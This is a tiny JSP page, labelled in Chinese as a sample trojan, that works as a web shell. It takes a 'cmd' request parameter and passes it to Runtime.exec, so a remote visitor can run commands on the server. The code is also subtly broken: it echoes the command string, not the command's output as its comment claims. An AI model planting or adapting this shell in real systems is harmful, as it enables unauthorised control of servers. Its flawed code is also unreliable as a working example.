<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>JSP版示例木马</title>
</head>
<body>
<!-- 可以执行黑客输入的命令，并将命令的返回结果显示在网页上 -->

<% 
String cmd = request.getParameter("cmd");

Runtime.getRuntime().exec("cmd "+cmd);

String result = cmd;
%>


<%=result %>

</body>
</html>